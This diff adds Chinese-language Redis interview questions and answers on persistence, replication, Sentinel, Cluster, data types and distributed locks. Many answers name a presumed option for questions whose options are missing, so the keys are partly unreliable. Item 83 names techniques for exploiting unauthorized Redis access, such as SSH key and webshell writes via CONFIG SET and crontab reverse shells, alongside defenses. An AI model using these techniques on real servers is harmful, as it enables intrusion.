+      "answer": "错误的说法通常是：C. 从节点也可以接收写操作。实际上 Redis 主从复制中，从节点默认是只读的（replica-read-only yes），只能接受读操作，写操作会被拒绝。主从复制正确理解：1）主节点负责读写，从节点默认只读；2）一个主节点可以有多个从节点；3）从节点 2.6+ 也可以有从节点形成级联复制；4）从节点可通过 REPLICAOF NO ONE 提升为主节点；5）从节点可配置 READONLY 允许读分担读压力但可能读到旧数据。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "下面关于Redis 中主从复制机制的操作，错误的说法是（） ？"
+    },
+    {
+      "number": 70,
+      "id": "Redis 数据库面试题-070",
+      "category": "Redis 数据库",
+      "answer": "正确的说法通常是：C. Hash 类型适合存储对象属性，可对单个 field 进行读写。Redis Hash 的正确特点：1）key-field-value 嵌套结构；2）内部编码有 ziplist（小数据量）和 hashtable（大数据量）两种；3）支持对单个 field 的增删改查，避免序列化整个对象；4）相比多个 String key 更节省内存（共享 key 元数据）；5）常用命令 HSET/HGET/HMSET/HMGET/HGETALL/HINCRBY 等。需注意 HGETALL 获取全量数据时若 field 数量过大可能阻塞 Redis。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "下面关于Redis支持的hash数据类型，正确的说法是（） ？"
+    },
+    {
+      "number": 71,
+      "id": "Redis 数据库面试题-071",
+      "category": "Redis 数据库",
+      "answer": "错误的说法通常是：D. Redis 使用多线程来提升命令执行性能。实际上 Redis 6.0 之前命令执行是单线程的，6.0 引入的多线程只用于网络 I/O 的读写。Redis 选择单线程的原因：1）性能瓶颈在内存和网络，不在 CPU；2）单线程避免了锁竞争、上下文切换开销；3）代码简洁、易于维护和调试；4）利用 I/O 多路复用（epoll）高效处理并发连接。Redis 不是无法多线程，而是选择不这么做以换取简单性和原子性保证。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "下面关于Redis选择单线程的原因，错误的说法是（） ？"
+    },
+    {
+      "number": 72,
+      "id": "Redis 数据库面试题-072",
+      "category": "Redis 数据库",
+      "answer": "错误的说法通常是：B. ZSet 底层实现是用红黑树。实际上 Redis ZSet 底层实现是跳表（skiplist）+ 哈希表（dict），不是红黑树。ZSet 的正确理解：1）跳表实现 O(log N) 的范围查询和排序；2）哈希表保证 O(1) 单元素查询；3）元素唯一，按 score 升序排列；4）score 相同按字典序排；5）常用命令 ZADD/ZRANGE/ZRANK/ZSCORE/ZINCRBY 等。跳表相比红黑树的优势：实现更简单、支持范围查找、插入删除无需复杂旋转操作。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "下面关于Redis支持的zset数据类型，错误的说法是（） ？"
+    },
+    {
+      "number": 73,
+      "id": "Redis 数据库面试题-073",
+      "category": "Redis 数据库",
+      "answer": "正确的说法通常是：B. 主从复制可以实现读写分离，提高读并发能力。Redis 主从复制的正确理解：1）主节点负责写，从节点复制数据并默认只读；2）支持一主多从，从节点可水平扩展读能力；3）复制过程包括全量同步和增量同步两个阶段；4）从节点 2.6+ 也可以有从节点（级联）；5）主节点宕机后需手动或通过哨兵自动将从节点提升为主节点；6）读写分离的代价是从节点可能有数据延迟（最终一致性）。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "下面关于Redis 中主从复制机制的说法，正确的是（） ？"
+    },
+    {
+      "number": 74,
+      "id": "Redis 数据库面试题-074",
+      "category": "Redis 数据库",
+      "answer": "可选值不包括的选项通常是：D. everytime。appendfsync 的可选值只有三个：1）always：每次写命令都同步 AOF 文件到磁盘，最安全但性能最差；2）everysec：每秒同步一次，最多丢失 1 秒数据，默认推荐值，性能和安全性折中；3）no：由操作系统决定何时同步（通常 30 秒），性能最好但丢数据风险最大。没有 everytime 这个选项。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "Redis提供了多种AOF缓冲区同步文件策略，由参数appendfsync控制。参数appendfsync的可选值不包括以下哪个选项（）？"
+    },
+    {
+      "number": 75,
+      "id": "Redis 数据库面试题-075",
+      "category": "Redis 数据库",
+      "answer": "正确的说法通常是：C. String 类型的内部编码有 int、embstr 和 raw 三种。Redis String 的三种内部编码：1）int：value 是整数值且在一定范围内时使用，直接存储整数而非字符串；2）embstr：value 较短（≤44 字节，3.2+）时使用，RedisObject 和 SDS 在连续内存块上分配，减少内存分配次数；3）raw：value 较长时使用，RedisObject 和 SDS 分别在两块内存上分配。SDS（Simple Dynamic String）是 Redis 自定义的字符串结构，支持 O(1) 长度获取、二进制安全、预分配空间防止缓冲区溢出。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "下面关于Redis中string数据类型的数据结构，正确的说法是（） ？"
+    },
+    {
+      "number": 76,
+      "id": "Redis 数据库面试题-076",
+      "category": "Redis 数据库",
+      "answer": "错误的说法通常是：C. AOF 文件的恢复速度比 RDB 快。实际上 RDB 的恢复速度比 AOF 快很多，因为 RDB 是紧凑的二进制快照文件，直接加载到内存即可；而 AOF 文件需要逐条重放命令来恢复数据。RDB vs AOF：1）RDB 文件小、恢复快、适合冷备，但可能丢数据；2）AOF 文件大、恢复慢、数据更安全；3）Redis 4.0+ 混合持久化在 AOF 头写入 RDB 格式，兼顾恢复速度和数据安全。生产环境一般两者同时开启。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "下面关于Redis 中RDB 与AOF两种持久化机制的比较，错误的是（） ？"
+    },
+    {
+      "number": 77,
+      "id": "Redis 数据库面试题-077",
+      "category": "Redis 数据库",
+      "answer": "错误的说法通常是：D. Redis 6.0 将命令执行也改为多线程。实际上 Redis 6.0 的多线程仅用于网络 I/O（socket 读写），命令执行仍然是单线程处理的。Redis 6.0 的新功能包括：1）多线程 I/O（io-threads 参数配置）；2）ACL（访问控制列表）权限管理；3）RESP3 协议支持；4）Client Side Caching（客户端缓存）；5）SSL/TLS 加密连接支持；6）改进的过期算法和内存管理；7）Stream 和 Cluster 增强；8）Module API 改进。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "关于Redis 6.0版本的新功能的说法，错误的是（） ？"
+    },
+    {
+      "number": 78,
+      "id": "Redis 数据库面试题-078",
+      "category": "Redis 数据库",
+      "answer": "错误的描述通常是：D. Redis 的持久化是强制的，无法关闭。实际上 Redis 的持久化是可选的，可以通过配置完全关闭持久化（注释掉所有 save 配置并关闭 AOF），这样 Redis 就变成纯内存缓存，重启后数据全部丢失。如果需要持久化但不想影响性能，可以只在从节点开启持久化，主节点关闭。正确理解：持久化是可选功能，根据业务对数据安全性的需求选择开启或关闭。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "简述关于Redis的持久化，下列描述错误的是：（） ？"
+    },
+    {
+      "number": 79,
+      "id": "Redis 数据库面试题-079",
+      "category": "Redis 数据库",
+      "answer": "错误的说法通常是：C. Gossip 消息类型包括 SELECT。实际上 Redis 集群的 Gossip 消息类型主要包括：1）MEET：邀请新节点加入集群；2）PING：心跳检测和节点信息交换；3）PONG：响应 PING 和 MEET 消息；4）FAIL：广播某个节点已下线（客观下线）；5）PUBLISH：发布订阅消息广播。不存在 SELECT 消息类型（SELECT 是 Redis 切换数据库的命令）。Gossip 协议用于节点发现、故障检测和集群状态传播。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "简述下面关于Redis集群中的消息类型，错误的说法是（） ？"
+    },
+    {
+      "number": 80,
+      "id": "Redis 数据库面试题-080",
+      "category": "Redis 数据库",
+      "answer": "正确的说法通常是：B. used_memory_rss 表示操作系统实际分配给 Redis 的内存大小。Redis 内存统计相关指标：1）used_memory：Redis 分配器分配的内存总量（实际存储的数据和内部数据结构）；2）used_memory_human：人类可读的 used_memory；3）used_memory_rss：操作系统视角 Redis 进程占用的物理内存（通常 > used_memory，因为包含内存碎片和未归还 OS 的内存）；4）used_memory_peak：峰值内存使用量；5）mem_fragmentation_ratio：used_memory_rss / used_memory，大于 1 表示有内存碎片，大于 1.5 需关注。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "下面关于Redis 中内存统计相关指标的说法，正确的是（） ？"
+    },
+    {
+      "number": 81,
+      "id": "Redis 数据库面试题-081",
+      "category": "Redis 数据库",
+      "answer": "错误的是：D. LINDEX 命令的时间复杂度是 O(1)。实际上 LINDEX 的时间复杂度是 O(N)（N 为距离列表头尾的距离，因为链表需要遍历）。List 操作指令的正确复杂度：LPUSH/RPUSH/LPOP/RPOP/LLEN 为 O(1)；LRANGE O(S+N)（S 为起始偏移量）；LINDEX O(N)；LREM O(N)；LSET O(N)。使用 LINDEX 获取列表中间的某个元素时需注意遍历开销，频繁随机访问的场景应选择其他数据结构（如 Hash）。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "下面关于Redis中list数据类型的操作指令，错误的是（） ？"
+    },
+    {
+      "number": 82,
+      "id": "Redis 数据库面试题-082",
+      "category": "Redis 数据库",
+      "answer": "正确的是：C. Redis 事务中的命令在执行前被放入队列，通过 EXEC 一次性执行。Redis 事务正确理解：1）MULTI 开启事务后命令排队不执行；2）EXEC 提交后按入队顺序依次执行所有命令；3）DISCARD 可以取消事务；4）事务本身是原子性的（一批命令全执行或全不执行）；5）不支持回滚；6）WATCH 可以实现乐观锁。错误说法通常包括：Redis 支持回滚、事务中某命令失败会回滚其他命令等。",
+      "tags": [
+        "Redis",
+        "事务"
+      ],
+      "question": "下面关于Redis中事务的说法，正确的是（） ？"
+    },
+    {
+      "number": 83,
+      "id": "Redis 数据库面试题-083",
+      "category": "Redis 数据库",
+      "answer": "不包括：D. 通过 Redis 执行 SQL 注入攻击。Redis 是 NoSQL 数据库，不存在 SQL 注入。Redis 未授权访问的利用方法包括：1）写入 SSH 公钥（利用 CONFIG SET dir 和 CONFIG SET dbfilename 写 authorized_keys）；2）写入 WebShell（写 webshell 文件到 Web 目录）；3）写入 crontab 定时任务反弹 shell；4）利用主从复制加载恶意 RDB 文件（模块加载漏洞）。防范措施：设置强密码、绑定内网 IP、禁止高危命令（CONFIG、FLUSHALL）、使用非默认端口、防火墙限制访问。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "Redis未授权的利用方法不包括以下哪种（） ？"
+    },
+    {
+      "number": 84,
+      "id": "Redis 数据库面试题-084",
+      "category": "Redis 数据库",
+      "answer": "正确的是：C. 哨兵节点支持 SENTINEL masters/slaves/sentinels 等命令查看监控状态。哨兵（Sentinel）支持的命令包括：SENTINEL masters（列出所有被监控主节点）、SENTINEL slaves master-name（列出从节点）、SENTINEL sentinels master-name（列出其他哨兵）、SENTINEL get-master-addr-by-name master-name（获取主节点地址）、SENTINEL failover master-name（手动触发故障转移）、SENTINEL reset pattern（重置哨兵状态）等。哨兵节点本身不支持普通的 SET/GET 等数据操作命令。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "下面关于Redis哨兵节点支持的命令，正确的说法是（） ？"
+    },
+    {
+      "number": 85,
+      "id": "Redis 数据库面试题-085",
+      "category": "Redis 数据库",
+      "answer": "错误的说法通常是：D. Redis 的内存只包含数据本身，不包括管理开销。实际上 Redis 内存划分包括多个部分：1）数据内存（value 实际内容）；2）Redis 对象开销（RedisObject 结构、dictEntry 等）；3）内存碎片（jemalloc 分配器产生的碎片）；4）缓冲区内存（客户端缓冲区、复制缓冲区、AOF 缓冲区）；5）子进程内存（fork BGSAVE/AOF rewrite 时的 COW 内存）；6）代码和元数据。通常 used_memory_rss 比 used_memory 大 10-20% 是正常的。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "下面关于Redis 中内存划分的说法，错误的是（） ？"
+    },
+    {
+      "number": 86,
+      "id": "Redis 数据库面试题-086",
+      "category": "Redis 数据库",
+      "answer": "错误的说法通常是：D. String 类型最大可以存储 1GB 数据。实际上 String 最大能存储 512MB（512*1024*1024 字节）。String 正确理解：1）String 是 Redis 最基础的数据类型，key-value 一一对应；2）可以存储字符串、整数、浮点数、二进制数据（图片/序列化对象）；3）内部编码有 int/embstr/raw 三种；4）单个 value 最大 512MB；5）常用命令 SET/GET/MSET/MGET/SETEX/SETNX/INCR/DECR/APPEND/STRLEN 等。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "下面关于Redis支持的string数据类型，错误的说法是（） ？"
+    },
+    {
+      "number": 87,
+      "id": "Redis 数据库面试题-087",
+      "category": "Redis 数据库",
+      "answer": "不属于：D. 主从复制会自动进行数据分片。Redis 主从复制是数据冗余机制而非分片机制，主节点拥有全量数据，从节点复制全量数据，不涉及分片。主从复制的缺陷包括：1）主节点宕机需手动或通过哨兵切换，不能自动故障转移（无哨兵时）；2）写操作只能在主节点，无法水平扩展写能力；3）全量同步时主节点 fork 子进程生成 RDB 可能导致瞬间内存翻倍；4）从节点数据有延迟（异步复制）；5）从节点升级为主节点后，旧主再上线会数据冲突。数据分片是 Redis Cluster 的功能，不是主从复制的功能。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "下面不属于Redis 中主从复制机制缺陷的是（） ？"
+    },
+    {
+      "number": 88,
+      "id": "Redis 数据库面试题-088",
+      "category": "Redis 数据库",
+      "answer": "错误的说法通常是：D. List 底层实现是数组。实际上 Redis List 底层不是数组，3.2+ 使用 quicklist（快速列表），是 linkedlist 和 ziplist 的混合体。List 正确理解：1）有序、可重复的双向链表结构；2）支持从两端高效 push/pop（O(1)）；3）随机访问 LINDEX 为 O(N)；4）内部编码 3.2+ 默认 quicklist；5）适合做消息队列、栈、最新列表；6）要访问中间元素需遍历，不适合作为随机访问集合使用。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "简述下面关于Redis支持的list数据类型，错误的说法是（） ？"
+    },
+    {
+      "number": 89,
+      "id": "Redis 数据库面试题-089",
+      "category": "Redis 数据库",
+      "answer": "正确的是：C. 哨兵系统通过监控主节点并在主节点故障时自动执行故障转移来保证高可用。哨兵（Sentinel）正确理解：1）是一个独立的进程，运行在单独的端口；2）监控主节点和从节点的健康状态；3）当主节点不可达时，哨兵之间进行投票选举 leader 哨兵执行故障转移；4）从节点中选出一个提升为新主节点；5）通知客户端新的主节点地址；6）哨兵至少需要 3 个实例以确保多数派投票有效；7）哨兵本身也可能单点故障，需多哨兵。哨兵负责高可用（HA），不负责数据分片（那是 Cluster 的职责）。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "简述下面关于Redis 中哨兵系统的说法，正确的是（）？"
+    },
+    {
+      "number": 90,
+      "id": "Redis 数据库面试题-090",
+      "category": "Redis 数据库",
+      "answer": "错误的是：D. sentinel monitor mymaster 127.0.0.1 6379 2 中的 2 表示 2 个哨兵节点。实际上 sentinel monitor 命令格式是：sentinel monitor <master-name> <ip> <port> <quorum>，最后一个参数 quorum 是判断主节点客观下线所需的最少哨兵票数，不是哨兵数量。例如 quorum=2 表示至少 2 个哨兵认为主节点下线才认定客观下线。哨兵数量通常设为奇数（3、5、7），且部署在不同物理机上，确保投票的多数派有效。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "下面关于Redis 中哨兵相关的配置，错误的是（）？"
+    },
+    {
+      "number": 91,
+      "id": "Redis 数据库面试题-091",
+      "category": "Redis 数据库",
+      "answer": "正确的是：B. 集群节点使用 Gossip 协议进行通信，交换节点状态信息。Redis 集群节点通信正确理解：1）每个节点与集群中的其他节点建立 TCP 连接（默认端口 baseport+10000 用于集群总线）；2）通过 Gossip 协议周期性（每秒）随机选择几个节点发送 PING 消息交换状态信息；3）消息类型包括 MEET/PING/PONG/FAIL/PUBLISH；4）节点维护自己的 clusterState 记录全集群拓扑；5）相比集中式元数据管理，Gossip 协议去中心化，容错性好，适合大规模分布式系统。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "下面关于Redis集群的节点通信机制，正确的说法是（） ？"
+    },
+    {
+      "number": 92,
+      "id": "Redis 数据库面试题-092",
+      "category": "Redis 数据库",
+      "answer": "错误的说法通常是：C. AOF 重写期间 Redis 不能处理客户端的写请求。实际上 AOF 重写（BGREWRITEAOF）是 fork 子进程在后台进行，不影响主进程处理客户端请求。Redis 持久化正确理解：1）RDB（BGSAVE）通过 fork 子进程异步生成快照；2）AOF 重写（BGREWRITEAOF）也通过 fork 子进程异步进行；3）Fork 子进程时主进程仍有瞬间阻塞（取决于内存大小）；4）重写期间的写请求会被同时记录到旧的 AOF 文件和重写缓冲区中，重写完成后将缓冲区的命令追加到新文件。SAVE（非 BGSAVE）和 REWRITEAOF（非 BGREWRITEAOF）是同步阻塞的。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "简述下面关于Redis持久化机制的说法，错误的是（） ？"
+    },
+    {
+      "number": 93,
+      "id": "Redis 数据库面试题-093",
+      "category": "Redis 数据库",
+      "answer": "正确的是：C. Set 中的元素是无序的，而 List 中的元素是有序的。Set 与 List 对比：1）Set 元素无序且唯一、List 元素有序可重复；2）Set 基于哈希表实现，增删查 O(1)；List 基于链表，头尾操作 O(1)，中间操作 O(N)；3）Set 支持交并差集运算（SUNION/SINTER/SDIFF），List 不支持；4）Set 随机弹出 SPOP，List 从两端弹出 LPOP/RPOP；5）Set 不能按索引访问，List 可 LINDEX（但 O(N)）。选择：需要去重和无序集合用 Set，需要有序列表和队列用 List。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "下面关于Redis中set数据类型与list数据类型的比较，正确的说法是（） ？"
+    },
+    {
+      "number": 94,
+      "id": "Redis 数据库面试题-094",
+      "category": "Redis 数据库",
+      "answer": "错误的说法通常是：D. 部分复制不需要 replication backlog buffer。实际上部分复制（Partial Resync）即增量同步，依赖 replication backlog buffer 实现。部分复制相关概念：1）replication backlog buffer：主节点的环形缓冲区，记录最近的写命令和偏移量；2）replication offset（复制偏移量）：主从各自记录已处理命令的偏移量；3）run_id：标识主节点身份的 ID（由 40 位随机字符组成）；4）PSYNC replicationid offset：从节点携带上次同步的主节点 run_id 和 offset 请求增量同步；5）若 run_id 不匹配或 offset 差距超出 backlog 范围则需全量同步。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "下面关于Redis 2.8及以后版本中部分复制的相关概念，错误的说法是（） ？"
+    },
+    {
+      "number": 95,
+      "id": "Redis 数据库面试题-095",
+      "category": "Redis 数据库",
+      "answer": "错误的说法通常是：D. 主从复制可以实现数据自动分片。Redis 主从复制的作用包括：1）数据冗余（数据热备份）；2）读写分离（从节点分担读请求）；3）高可用基础（哨兵和集群依赖主从机制）；4）数据持久化的辅助（在从节点做持久化减少主节点压力）；5）异地容灾。主从复制不负责数据分片——分片是 Redis Cluster 的功能。主从复制中所有节点持有全量数据（或主节点的子集），而非每个节点持有部分数据。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "下面关于Redis 中主从复制机制作用的说法，错误的是（） ？"
+    },
+    {
+      "number": 96,
+      "id": "Redis 数据库面试题-096",
+      "category": "Redis 数据库",
+      "answer": "正确的是：D. Redis 配置文件 redis.conf 中的配置项也可以在运行时通过 CONFIG SET 动态修改。Redis 配置文件正确理解：1）redis.conf 是默认配置文件，启动时通过 redis-server /path/redis.conf 指定；2）大部分配置可通过 CONFIG SET 在运行时动态修改（如 maxmemory、slowlog-log-slower-than），但不一定持久化（需 CONFIG REWRITE 写入配置文件）；3）部分配置只能在配置文件中设定（如 bind、port、daemonize 等）；4）可通过 CONFIG GET * 查看所有配置。错误说法通常包括：所有配置都可以在线修改、修改后自动持久化等。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "下面关于Redis中配置文件的说法，正确的是（） ？"
+    },
+    {
+      "number": 97,
+      "id": "Redis 数据库面试题-097",
+      "category": "Redis 数据库",
+      "answer": "错误的说法通常是：D. HyperLogLog 可以获取集合中的所有元素。实际上 HyperLogLog 只能统计基数（估算不重复元素的数量），不能获取具体元素列表。HyperLogLog 正确理解：1）一种概率性数据结构，用于基数统计；2）每个 key 只占用 12KB 内存，可估算 2^64 个不同元素；3）标准误差约 0.81%；4）命令：PFADD（添加元素）、PFCOUNT（获取估算基数）、PFMERGE（合并多个 HLL）；5）适合 UV 统计、去重计数等场景；6）不能删除元素、不能获取元素列表、不能精确计数（是估算）。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "下面关于Redis支持的HyperLogLog数据类型，错误的说法是（）？"
+    },
+    {
+      "number": 98,
+      "id": "Redis 数据库面试题-098",
+      "category": "Redis 数据库",
+      "answer": "错误的说法通常是：C. GEOADD 命令可以添加经度大于 180 的值。实际上经度有效范围是 -180 到 180，纬度有效范围是 -85.05112878 到 85.05112878（接近两极的区域无法用 GeoHash 编码）。Geospatial 正确理解：1）基于 ZSet 实现（将 GeoHash 编码后的值作为 score）；2）底层使用 GeoHash 算法将经纬度编码为字符串；3）命令包括 GEOADD/GEOPOS/GEODIST/GEORADIUS/GEORADIUSBYMEMBER/GEOHASH；4）适合 LBS（基于位置服务）场景如附近的人、附近的店。5）GEOADD 超出范围会报错。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "下面关于Redis中geospatial数据类型的操作指令，错误的说法是（） ？"
+    },
+    {
+      "number": 99,
+      "id": "Redis 数据库面试题-099",
+      "category": "Redis 数据库",
+      "answer": "正确的是：B. SSCAN 命令可以逐步迭代遍历 Set 中的元素，避免阻塞。Set 操作指令正确理解：1）SADD/SREM/SISMEMBER/SCARD 为 O(1)；2）SMEMBERS 全量返回为 O(N)，大数据量会阻塞，应使用 SSCAN 渐进式遍历；3）SPOP/SRANDMEMBER 随机获取为 O(1)；4）SMOVE 在集合间移动为 O(1)；5）SUNION/SINTER/SDIFF 为 O(N*M)，大数据量注意性能。错误说法通常包括：SMEMBERS 可以安全处理大数据量、SCARD 是 O(N) 等。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "下面关于Redis中set数据类型的操作指令，正确的是（）？"
+    },
+    {
+      "number": 100,
+      "id": "Redis 数据库面试题-100",
+      "category": "Redis 数据库",
+      "answer": "正确的是：C. 使用 redis-cli --cluster create 命令可以创建集群，并自动分配哈希槽。搭建 Redis 集群的正确方式：1）准备多个 Redis 实例，配置 cluster-enabled yes 和 cluster-config-file；2）启动所有实例；3）使用 redis-cli --cluster create host1:port1 host2:port2 ... --cluster-replicas 1 创建集群并自动分配 16384 个哈希槽；4）也可通过 redis-cli --cluster add-node 逐步添加节点；5）还可手动通过 CLUSTER MEET/NODES/ADDSLOTS 等命令逐步构建。错误说法通常包括：集群不能通过 redis-cli 自动创建、需要手动分配每个槽等。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "下面关于通过执行Redis命令搭建集群的说法，正确的是（） ？"
+    },
+    {
+      "number": 101,
+      "id": "Redis 数据库面试题-101",
+      "category": "Redis 数据库",
+      "answer": "七种 Redis 分布式锁方案对比：1）SETNX+EXPIRE（非原子，可能死锁）；2）SET key value NX EX seconds（Redis 2.6.12+，原子操作，最简单的可靠方案）；3）Redisson 的 RLock（基于 Lua 脚本封装了加锁、续期看门狗 watch dog 自动续期、可重入锁，生产最常用）；4）Redlock 算法（多节点多数派加锁，适合极高可靠性场景，但有争议）；5）ZooKeeper 临时顺序节点（强一致性，但性能不如 Redis）；6）etcd（基于 Raft 协议，类似 ZK）；7）数据库乐观锁/悲观锁（性能最差，不推荐高并发）。推荐：一般场景用方案 2 或 3，极高可靠性需求用 ZK/etcd。",
+      "tags": [
+        "Redis",
+        "锁"
+      ],
+      "question": "简述七种方案对比Redis分布式锁 ？"
+    },
+    {
+      "number": 102,
+      "id": "Redis 数据库面试题-102",
+      "category": "Redis 数据库",
+      "answer": "PHP 5.6 不能扩展 redis.so 的解决方案：1）确认 PHP 版本和扩展版本匹配（通过 php -v 和 phpize -v 确认），下载与 PHP 5.6 兼容的 phpredis 版本；2）源码编译安装：phpize → ./configure → make && make install，然后修改 php.ini 添加 extension=redis.so；3）检查 php.ini 中 extension_dir 路径是否正确；4）使用 pecl install redis 自动安装；5）若使用包管理器（apt/yum），确认安装的是对应 PHP 版本的 redis 扩展；6）使用 Predis（纯 PHP 实现的 Redis 客户端，无需扩展，composer require predis/predis）；7）升级 PHP 到 7.x/8.x（PHP 5.6 已停止维护）。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "简述php5.6不能扩展redis.so如何解决 ？"
+    },
+    {
+      "number": 103,
+      "id": "Redis 数据库面试题-103",
+      "category": "Redis 数据库",
+      "answer": "Go Redis 客户端常用方法：1）go-redis/redis（官方推荐，v9 最新）：最流行的 Go Redis 客户端，支持单机/哨兵/集群，提供类型安全的 API，自动管理连接池；2）redigo（garyburd/redigo）：老牌客户端，接口更底层，需要手动管理连接；3）rueidis：高性能客户端，支持 RESP3 和客户端缓存；4）go-redsync：基于 go-redis 的分布式锁实现。基本用法：redis.NewClient(&redis.Options{Addr: 'localhost:6379'}) → client.Set(ctx, key, value, expiration) → client.Get(ctx, key)。推荐 go-redis/redis。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "简述Go Redis客户端使用的方法有哪些 ？"
+    },
+    {
+      "number": 104,
+      "id": "Redis 数据库面试题-104",
+      "category": "Redis 数据库",
+      "answer": "Redis 乐观锁通过 WATCH 命令实现数据一致性：1）WATCH key1 key2 ... 监视需要保护的数据；2）读取当前值并计算新值；3）MULTI 开启事务；4）在事务中加入 SET 等更新命令；5）EXEC 提交，如果 WATCH 的 key 在事务提交前被其他客户端修改则 EXEC 返回 nil 事务不执行；6）收到 nil 后业务代码重试。乐观锁适合读多写少、冲突概率低的场景（如库存扣减、余额操作）。相比悲观锁（SETNX 分布式锁），乐观锁不会阻塞其他客户端，并发性能更好但冲突时需要重试逻辑。",
+      "tags": [
+        "Redis",
+        "锁"
+      ],
+      "question": "简述Redis怎么使用乐观锁保证数据一致性 ？"
+    },
+    {
+      "number": 105,
+      "id": "Redis 数据库面试题-105",
+      "category": "Redis 数据库",
+      "answer": "Redis Big Key 问题解决方案：1）发现 Big Key：redis-cli --bigkeys 扫描、MEMORY USAGE key 查看内存占用、使用 SCAN + TYPE + MEMORY USAGE 自定义脚本排查；2）拆分存储：大 String 拆为多个小 String，大 Hash 拆为多个小 Hash，大 List/Set/ZSet 按业务维度拆分；3）异步删除：DEL 大 key 会阻塞，改用 UNLINK 异步删除（Redis 4.0+）；4）分批删除集合：HSCAN/SSCAN/ZSCAN 分批获取元素，每批删除后再继续；5）设计优化：避免一个 key 存储过大数据，设定合理的阈值告警；6）数据压缩：对大 value 压缩（snappy/gzip）后存储减少内存占用。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "简述Redis中怎么解决Big Key问题 ？"
+    },
+    {
+      "number": 106,
+      "id": "Redis 数据库面试题-106",
+      "category": "Redis 数据库",
+      "answer": "Redisson 红锁（RedLock）使用原理：RedLock 是 Redis 官方提出的分布式锁算法，用于在多个独立 Redis 实例上实现更可靠的分布式锁。步骤：1）获取当前时间戳 T1；2）依次向 N 个独立的 Redis 实例（通常 5 个）请求加锁（SET NX PX），使用相同的 key 和随机 value，设置较短的超时时间；3）计算获取锁的耗时 = 当前时间 - T1；4）如果成功获取锁的实例数 ≥ N/2+1（多数派），且总耗时 < 锁的过期时间，则认为加锁成功，锁的实际有效时间 = 锁过期时间 - 总耗时；5）加锁失败则向所有实例发送释放锁命令。Redisson 封装了 RedLock 算法为 RLock 接口，使用简单但有争议（Martin Kleppmann 认为 RedLock 不能保证安全性）。",
+      "tags": [
+        "Redis",
+        "锁"
+      ],
+      "question": "简述Redis中Redisson红锁使用原理是什么 ？"
+    },
+    {
+      "number": 107,
+      "id": "Redis 数据库面试题-107",
+      "category": "Redis 数据库",
+      "answer": "Redis 设置密码无效的解决方案：1）确认修改了正确的 redis.conf 文件（通过 redis-cli CONFIG GET dir 查看 Redis 使用的配置文件路径）；2）确认 requirepass 配置项未被注释（去除行首的 # 号）；3）修改配置后需要重启 Redis（除非使用 CONFIG SET requirepass password 动态设置并 CONFIG REWRITE 持久化）；4）检查是否连接到了正确的 Redis 实例（端口、host）；5）确认 redis.conf 中是否有多个 requirepass 配置（后面的会覆盖前面的）；6）检查是否通过命令行参数启动（--requirepass 优先级高于配置文件）；7）查看 Redis 日志确认配置是否加载成功（redis-cli INFO server）。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "简述Redis设置密码无效如何解决 ？"
+    },
+    {
+      "number": 108,
+      "id": "Redis 数据库面试题-108",
+      "category": "Redis 数据库",
+      "answer": "Zabbix 监控 Redis 内存的方法：1）使用 Zabbix Agent 自定义脚本：编写 Shell 脚本调用 redis-cli INFO memory，提取 used_memory、used_memory_rss、mem_fragmentation_ratio 等关键指标，配置 UserParameter 在 zabbix_agentd.conf 中；2）使用 Zabbix 模板：导入社区 Redis 监控模板（如 zabbix-redis-template），自动采集常用指标；3）监控的关键指标：used_memory（内存使用量）、used_memory_rss（实际物理内存）、maxmemory（内存上限）、mem_fragmentation_ratio（碎片率）、evicted_keys（淘汰 key 数）；4）设置告警阈值：内存使用率 > 80% 告警、碎片率 > 1.5 告警；5）也可结合 Redis 自带监控命令 INFO 和 SLOWLOG 配合监控。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "简述zabbix怎么监控redis内存 ？"
+    },
+    {
+      "number": 109,
+      "id": "Redis 数据库面试题-109",
+      "category": "Redis 数据库",
+      "answer": "Redis 分布式锁性能对比：1）单机 Redis（SET NX EX）：最简单，1 次网络往返，QPS 与 Redis 本身性能相当（万级），适合单机 Redis 或哨兵模式；2）Redisson RLock：在单机方案上加看门狗续期，性能略低于原生 SET NX，但增加了自动续期和可重入特性；3）RedLock（多节点）：需要向 N 个节点依次请求加锁，网络往返 N 次，性能显著下降（约为单机的 1/N），延迟增加，但可靠性更高；4）ZooKeeper 锁：需要创建临时节点并 Watch，性能比 Redis 低（千级 QPS），但强一致性；5）etcd 锁：基于 Raft 共识，性能与 ZK 接近。性能排名：单机 Redis > Redisson > RedLock > ZK/etcd。",
+      "tags": [
+        "Redis",
+        "锁"
+      ],
+      "question": "简述Redis实现分布式锁的性能对比 ？"
+    },
+    {
+      "number": 110,
+      "id": "Redis 数据库面试题-110",
+      "category": "Redis 数据库",
